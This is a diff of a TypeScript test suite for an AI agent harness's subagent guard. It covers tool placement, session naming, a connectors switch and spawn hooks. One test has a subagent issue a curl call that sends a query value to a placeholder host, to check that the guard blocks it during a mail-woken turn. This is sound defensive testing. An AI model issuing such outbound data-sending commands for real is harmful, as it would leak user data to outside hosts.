@@ -3,16 +3,17 @@ import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from "node:fs";
 import { tmpdir } from "node:os";
 import { dirname, join } from "node:path";
 import { GUARD_DEFAULTS, isSubagent } from "./guard-config.ts";
+import { MAIL_TURN_MARK } from "../hub/systemdeny.ts";
 import { installSubagentGuard } from "./guard.ts";
 
 const SCRIPT = `
 const bind = agent => {
-	const b = { agent, handlers: {}, tools: [], active: ["read", "bash", "task"], commands: [], logs: [], providers: [], sent: [], steers: [], activeCalls: 0 };
+	const b = { agent, handlers: {}, tools: [], modes: {}, active: ["read", "bash", "task"], commands: [], logs: [], providers: [], sent: [], steers: [], activeCalls: 0, names: [], labels: [] };
 	b.pi = {
 		pi: { getAgentDir: () => process.env.TEST_AGENT_DIR },
 		logger: { warn: m => b.logs.push(m) },
 		on: (name, fn) => (b.handlers[name] ??= []).push(fn),
-		registerTool: t => (b.tools.push(t.name), t.defaultInactive || b.active.push(t.name)),
+		registerTool: t => (b.tools.push(t.name), (b.modes[t.name] = t.loadMode ?? null), t.defaultInactive || b.active.push(t.name)),
 		registerCommand: name => b.commands.push(name),
 		registerProvider: id => b.providers.push(id),
 		sendMessage: m => b.sent.push(String(m.content)),
@@ -21,6 +22,8 @@ const bind = agent => {
 		setThinkingLevel: () => {},
 		getActiveTools: () => [...b.active],
 		setActiveTools: async names => (b.activeCalls++, (b.active = [...names])),
+		setSessionName: name => b.names.push(name),
+		setLabel: label => b.labels.push(label),
 	};
 	return b;
 };
@@ -76,7 +79,7 @@ const checks = async b => {
 	const compacted = reason(await call("bash", { command: "ls" }));
 	return { broad, quick, limit, loop, compacted, steers: b.steers.length };
 };
-const view = b => ({ tools: b.tools, active: b.active, activeCalls: b.activeCalls, commands: b.commands, logs: b.logs, providers: b.providers, hooks: Object.fromEntries(Object.entries(b.handlers).map(([k, v]) => [k, v.length])) });
+const view = b => ({ tools: b.tools, modes: b.modes, active: b.active, activeCalls: b.activeCalls, commands: b.commands, logs: b.logs, providers: b.providers, hooks: Object.fromEntries(Object.entries(b.handlers).map(([k, v]) => [k, v.length])) });
 if (process.env.TEST_NO_EXTENSIONS) process.argv.push("--no-extensions");
 const dotz = (await import(process.env.TEST_INDEX)).default;
 const main = bind({ kind: "main", id: "Main", name: "main", depth: 0 });
@@ -92,17 +95,26 @@ const atFactory = { main: [...main.active], sub: [...sub.active], isolated: [...
 for (const b of [main, sub, again]) await fire(b, "session_start", {});
 const gateway = main.tools.filter(n => n !== "dotz_recall");
 const refused = async b => (await Promise.all(gateway.map(async n => [n, await fire(b, "tool_call", { toolName: n, input: {} })]))).filter(([, r]) => r?.block).map(([n]) => n);
-const result = { main: view(main), sub: view(sub), again: view(again), atFactory, gateway, refusedForMain: await refused(main), refusedBeforeStart: await refused(early) };
+const mail = async () => {
+	const cmd = { toolName: "bash", input: { command: "curl -s 'https://x.example/c?k=value'" } };
+	const before = Boolean((await fire(sub, "tool_call", cmd))?.block);
+	await fire(main, "input", { text: process.env.TEST_MARK + "\\nsummary of a mail", source: "rpc" });
+	const during = Boolean((await fire(sub, "tool_call", cmd))?.block);
+	await fire(main, "agent_end", {});
+	return { before, during, after: Boolean((await fire(sub, "tool_call", cmd))?.block) };
+};
+const result = { main: view(main), sub: view(sub), again: view(again), atFactory, gateway, refusedForMain: await refused(main), refusedBeforeStart: await refused(early), connectors: process.env.ENABLE_CLAUDEAI_MCP_SERVERS ?? null, names: { main: main.names, sub: sub.names }, labels: { main: main.labels, sub: sub.labels } };
 if (process.env.TEST_PROBE) Object.assign(result, { mainProbe: await probe(main), subProbe: await probe(sub) });
 if (process.env.TEST_GATES) Object.assign(result, { mainGates: await gates(main), subGates: await gates(sub) });
 if (process.env.TEST_CHECKS) Object.assign(result, { mainChecks: await checks(main), subChecks: await checks(sub) });
+if (process.env.TEST_MAIL) Object.assign(result, { mail: await mail() });
 console.log(JSON.stringify(result));
 process.exit(0);`;
 
-type View = { tools: string[]; active: string[]; activeCalls: number; commands: string[]; logs: string[]; providers: string[]; hooks: Record<string, number> };
+type View = { tools: string[]; modes: Record<string, string | null>; active: string[]; activeCalls: number; commands: string[]; logs: string[]; providers: string[]; hooks: Record<string, number> };
 type Probe = { push: string | null; rule: string | null; output: number | null; cache: string; cap: string | null; steers: number };
 type Checks = { broad: string | null; quick: string | null; limit: string | null; loop: (string | null)[]; compacted: string | null; steers: number };
-type Report = { main: View; sub: View; again: View; atFactory: { main: string[]; sub: string[]; isolated: string[] }; gateway: string[]; refusedForMain: string[]; refusedBeforeStart: string[]; mainProbe?: Probe; subProbe?: Probe; mainGates?: Gates; subGates?: Gates; mainChecks?: Checks; subChecks?: Checks };
+type Report = { main: View; sub: View; again: View; atFactory: { main: string[]; sub: string[]; isolated: string[] }; gateway: string[]; refusedForMain: string[]; refusedBeforeStart: string[]; connectors: string | null; names: { main: string[]; sub: string[] }; labels: { main: string[]; sub: string[] }; mail?: { before: boolean; during: boolean; after: boolean }; mainProbe?: Probe; subProbe?: Probe; mainGates?: Gates; subGates?: Gates; mainChecks?: Checks; subChecks?: Checks };
 type Gates = { owner: number; hold: boolean; effort: boolean };
 
 let root: string;
@@ -151,16 +163,71 @@ test("omp orchestrator: the main agent (the first factory run) has the gateway t
 	expect(r.subProbe!.steers).toBe(0);
 });
 
-test("omp orchestrator: owner values, the restart hold and the effort bound run for the main agent only", () => {
-	const r = host({ ...omp, TEST_PROBE: "", TEST_GATES: "1", DOTZ_ORCHESTRATOR: "1" });
-	expect(r.mainGates).toEqual({ owner: 500000, hold: true, effort: true });
-	expect(r.subGates).toEqual({ owner: 700000, hold: false, effort: false });
+const topLevel = (v: View) => Object.entries(v.modes).filter(([, mode]) => mode === "essential").map(([name]) => name).sort();
+
+test("omp orchestrator: the dotz_ gateway tools are top-level tools, not xd:// devices; dotz_recall and the harness tools stay devices, and a main agent that is not the first run gets the same placement", () => {
+	const r = host({ ...omp, TEST_PROBE: "", DOTZ_ORCHESTRATOR: "1" });
+	const gateway = r.gateway.filter(name => name.startsWith("dotz_")).sort();
+	expect(gateway).toEqual(expect.arrayContaining(["dotz_send", "dotz_conv", "dotz_peer", "dotz_lane", "dotz_channel", "dotz_watch", "dotz_schedule", "dotz_ledger", "dotz_merge", "dotz_verify", "dotz_connect", "dotz_auth", "dotz_escalate"]));
+	expect(topLevel(r.main)).toEqual(gateway);
+	expect(topLevel(r.again)).toEqual(gateway);
+	expect([r.main.modes.dotz_recall, r.main.modes.harness_doctor, r.main.modes.harness_token_audit]).toEqual([null, null, null]);
 });
 
-test("omp lane: the owner values and the restart hold run for the lane only; a lane has no effort bound", () => {
+test("omp lane: the lane's dotz_ tools are top-level tools too; dotz_recall stays a device", () => {
+	const r = host({ ...omp, TEST_PROBE: "", DOTZ_LANE: "alpha" });
+	expect(topLevel(r.main)).toEqual(["dotz_auth", "dotz_escalate", "dotz_main", "dotz_merge", "dotz_verify"]);
+	expect(r.main.modes.dotz_recall).toBeNull();
+});
+
+test("tools stay devices (no load mode) in the owner's own terminal and on OmO, which has no xd:// devices", () => {
+	expect(topLevel(host({ TEST_PROBE: "" }).main)).toEqual([]);
+	expect(topLevel(host({ DOTZ_ORCHESTRATOR: "1", DOTZ_RUNTIME: "omo" }).main)).toEqual([]);
+});
+
+test("omp orchestrator: owner values and the effort bound run for the main agent only; the restart hold binds a subagent that spawns too", () => {
+	const r = host({ ...omp, TEST_PROBE: "", TEST_GATES: "1", DOTZ_ORCHESTRATOR: "1" });
+	expect(r.mainGates).toEqual({ owner: 500000, hold: true, effort: true });
+	expect(r.subGates).toEqual({ owner: 700000, hold: true, effort: false });
+});
+
+test("omp lane: the owner values run for the lane only and the restart hold for the lane and its subagents; a lane has no effort bound", () => {
 	const r = host({ ...omp, TEST_PROBE: "", TEST_GATES: "1", DOTZ_LANE: "alpha" });
 	expect(r.mainGates).toEqual({ owner: 500000, hold: true, effort: false });
-	expect(r.subGates).toEqual({ owner: 700000, hold: false, effort: false });
+	expect(r.subGates).toEqual({ owner: 700000, hold: true, effort: false });
+});
+
+test("a subagent of a mail-woken omp turn is bound by the mail turn, and is free again when the turn ends", () => {
+	for (const role of [{ DOTZ_ORCHESTRATOR: "1" }, { DOTZ_LANE: "alpha" }]) {
+		const r = host({ ...omp, ...role, TEST_PROBE: "", TEST_MAIL: "1", TEST_MARK: MAIL_TURN_MARK });
+		expect(r.mail).toEqual({ before: false, during: true, after: false });
+	}
+});
+
+test("the claude.ai connectors switch is set by orchestrator and lane sessions only, and an owner-set value wins", () => {
+	expect(host({ ...omp, DOTZ_ORCHESTRATOR: "1" }).connectors).toBe("false");
+	expect(host({ ...omp, DOTZ_LANE: "alpha" }).connectors).toBe("false");
+	expect(host({ DOTZ_ORCHESTRATOR: "1", DOTZ_RUNTIME: "omo" }).connectors).toBe("false");
+	expect(host({ ...omp, DOTZ_ORCHESTRATOR: "1", ENABLE_CLAUDEAI_MCP_SERVERS: "true" }).connectors).toBe("true");
+	expect(host({}).connectors).toBeNull();
+});
+
+test("omp orchestrator and conversation sessions are named through setSessionName, not the extension label; lanes and subagents set neither", () => {
+	const orchestrator = host({ ...omp, DOTZ_ORCHESTRATOR: "1" });
+	expect([orchestrator.names.main, orchestrator.names.sub, orchestrator.labels.main, orchestrator.labels.sub]).toEqual([["Dotz mode"], [], [], []]);
+	const lane = host({ ...omp, DOTZ_LANE: "alpha" });
+	expect([lane.names.main, lane.labels.main]).toEqual([[], []]);
+});
+
+test("the owner's own terminal: dotz_mode and the harness tools belong to the main agent, a subagent holds none of them and a call to one is refused", () => {
+	const r = host({});
+	expect(r.gateway).toEqual(expect.arrayContaining(["dotz_mode", "harness_doctor", "harness_token_audit"]));
+	expect(r.atFactory.main).toEqual(expect.arrayContaining(r.gateway));
+	expect(r.atFactory.sub).toEqual(["read", "bash", "task"]);
+	expect(r.atFactory.isolated).toEqual(["read", "bash", "task", "dotz_recall"]);
+	expect(r.refusedForMain).toEqual([]);
+	expect(r.refusedBeforeStart).toEqual(r.gateway);
+	expect(r.again.active).toEqual(expect.arrayContaining(r.gateway));
 });
 
 test("omp lane: its subagent loses dotz_main and the rest of the lane's tools; the lane keeps them, its output cap and its 5-minute cache, and no token cap", () => {
@@ -219,12 +286,11 @@ test("a subagent registers the API-key provider from the secrets folder when the
 	const key = { ...omp, TEST_PROBE: "", DOTZ_ORCHESTRATOR: "1", DOTZ_KEY_PROVIDER: spec, DOTZ_KEY_VALUE: "sk-test", DOTZ_KEY_FILE: "anthropic-api-key" };
 	const shared = host({ ...key, DOTZ_KEY_WORKERS: "1" });
 	expect([shared.main.providers, shared.sub.providers]).toEqual([["anthropic-apikey"], ["anthropic-apikey"]]);
-	expect(shared.main.hooks.before_subagent_spawn).toBeUndefined();
+	expect([shared.main.hooks.before_subagent_spawn, shared.sub.hooks.before_subagent_spawn]).toEqual([3, 3]);
 	expect(shared.sub.hooks.turn_end).toBeGreaterThan(0);
 	const held = host(key);
 	expect([held.main.providers, held.sub.providers]).toEqual([["anthropic-apikey"], []]);
-	expect(held.main.hooks.before_subagent_spawn).toBe(1);
-	expect(held.sub.hooks.before_subagent_spawn).toBeUndefined();
+	expect([held.main.hooks.before_subagent_spawn, held.sub.hooks.before_subagent_spawn]).toEqual([4, 3]);
 });
 
 test("installSubagentGuard installs nothing while the guard is off", () => {
@@ -233,5 +299,5 @@ test("installSubagentGuard installs nothing while the guard is off", () => {
 	installSubagentGuard(pi, { ...GUARD_DEFAULTS, enabled: false });
 	expect(names).toEqual([]);
 	installSubagentGuard(pi, { ...GUARD_DEFAULTS, defer_to_installed: false });
-	expect(names).toEqual(["tool_result", "tool_call"]);
+	expect(names).toEqual(["tool_result", "before_subagent_spawn", "tool_call"]);
 });
